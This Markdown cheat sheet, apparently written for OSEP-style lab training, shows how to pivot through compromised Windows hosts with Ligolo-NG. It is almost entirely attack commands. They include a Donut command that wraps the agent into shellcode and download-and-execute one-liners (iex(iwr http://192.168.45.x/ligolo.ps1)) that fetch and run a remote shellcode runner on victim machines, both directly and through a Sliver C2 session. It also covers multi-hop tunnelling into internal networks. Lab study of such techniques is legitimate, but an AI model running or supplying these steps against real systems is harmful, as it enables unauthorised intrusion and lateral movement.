# Ligolo-NG (client) Agent
Ligolo-NG is a reliable way to get proxying to work in lab environments or for training. 

## Using Donut 
Making use of Donut by TheWover and will be used to wrap the Ligolo-ng agent binary (agent.exe) into position-independent shellcode, then execute the shellcode via sliver (or other shell interaction) to establish a new encrypted tunnel. 
Reference: https://github.com/TheWover/donut

note: Requires x64 bit process to run

```bash
┌──(kali㉿kali)-[~]
└─$ donut -f 1 -o agent.bin -a 2 -p "-connect <kaliIP>:11601 -ignore-cert" -i agent.exe
```

## Setup Ligolo-NG Server
Example Setup
```bash
# Compromised host is accessible via 192.168.243.0 network, want to access hosts on the internal 172.16.243.0 network
# Kali box is hosted on 192.168.45.0/24 and can communicate to 192.168.243.0/24 network
Eth0: 192.168.243.159
ETH1: 172.16.243.159

# Step 1 - Add Proxy TUN interface
┌──(kali㉿kali)-[~]
└─$ sudo ip tuntap add user kali mode tun ligolo
┌──(kali㉿kali)-[~]
└─$ sudo ip link set ligolo up

# Step 2 - Start Logilo-Proxy server
┌──(kali㉿kali)-[~]
└─$ ligolo-proxy -selfcert
```

## Setup Ligolo-NG Client Agents
This step will require you to transfer files to host or use powershell to run ligolo.ps1 shellcode runner (recommended)

### Using Ligolo through Shell
PS C:\Users\Public\Documents> iex(iwr http://192.168.45.173/ligolo.ps1 -UseBasicParsing)

### Using Ligolo with Sliver C2
To send request through sliver session via sharpsh
sliver (interactive) > sharpsh -- '-e -c <base64encoded>iex(iwr http://192.168.45.227/ligolo.ps1 -UseBasicParsing)'

## Setup Proxy
```bash
# Step 3 - Go to ligolo-proxy server console on kali and wait for Agent connection info will be displayed as such: 
ligolo-ng >> INFO [001] Agent Joined

# Step 4 - Select Agent session and select Enter
ligolo-ng >> session

# Step 5 - Confirm network interfaces with ifconfig
[AGENT : victim-1@sessionID] >> ifconfig

# Step 6 - Add IP Route of internal network to Kali host
┌──(kali㉿kali)-[~]
└─$ sudo ip route add 172.16.243.0/24 dev ligolo

# Step 7 - Start Ligolo-NG Server proxy
[AGENT : victim-1@sessionID] >> start

# can now nmap the IP Address of internal network without proxychains
┌──(kali㉿kali)-[~]
└─$ nmap -sn 172.16.243.150-155 -vv
```

## Setup additional hop to a secondary network
It should be noted, that C2 Agent Pivots should be used here instead of using ligolo-ng tunneling to communicate with the other networks. 

Example Setup
```bash
# Compromised host is accessible via 192.168.243.0 network, want to access hosts on the internal 172.16.243.0 network
# Victim 1
Eth0: 192.168.243.159
ETH1: 172.16.243.159 # IP used to forward traffic to Kali

# Victim 2
ETH0: 172.16.243.150
ETH1: 10.10.3.1

# Step 1 - Add Proxy TUN interface
┌──(kali㉿kali)-[~]
└─$ sudo ip tuntap add user kali mode tun Ligolo-2ndHost
┌──(kali㉿kali)-[~]
└─$ sudo ip link set ligolo-2ndHost up

# Step 2 - Start a listener on Host 1 (Victim 1)
[AGENT : victim-1@sessionID] listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# Step 3 - Generate new agent-2.bin donut shellcode 
┌──(kali㉿kali)-[~]
└─$ donut -f 1 -o agent-2.bin -a 2 -p "-connect 172.16.243.159:11601 -ignore-cert" -i agent.exe

# Step 4 - Update ligolo.ps1 (line 14) to agent-2.bin

# Step 5 - Run the donut nigolo-ng agent from Victim 2 machine 
sliver (interactive) > sharpsh -- '-e -c <base64encoded>iex(iwr http://192.168.45.227/ligolo.ps1 -UseBasicParsing)'

# Step 6 - Wait for agent to connect to Ligolo-NG Server console and select Victim-2 session
ligolo-ng >> session

# Step 7 - Start Tunnel
[Agent : victim-2@sessionID] >> tunnel_start -tun ligolo-2ndHost

# Step 8 - Add IP route to 10.10.3.0/24 network
┌──(kali㉿kali)-[~]
└─$ sudo ip add route 10.10.3.0/24 dev ligolo-ligolo-2ndHost
```

# References
Ligolo-NG How-To Guide https://www.stationx.net/how-to-use-ligolo-ng/
Code Repository Source https://github.com/Extravenger/OSEPlayground/tree/main/04%20-%20Tunneling